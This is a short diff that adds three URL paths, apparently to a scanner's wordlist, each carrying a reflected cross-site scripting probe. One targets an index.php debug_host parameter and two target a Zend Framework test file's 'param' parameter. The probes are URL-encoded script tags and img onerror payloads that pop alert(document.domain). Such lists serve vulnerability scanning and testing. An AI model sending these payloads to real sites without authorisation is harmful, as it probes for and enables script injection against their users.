@@ -1,0 +1,3 @@
+/index.php?debug_host=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&start_debug=1
+/vendor/diablomedia/zendframework1-http/tests/Zend/Http/Client/_files/testRedirections.php?redirection=3&param=<img/src=x%20onerror=alert(1)>
+/tests/Zend/Http/Client/_files/testRedirections.php?redirection=3&param=<img/src=x%20onerror=alert(document.domain)>
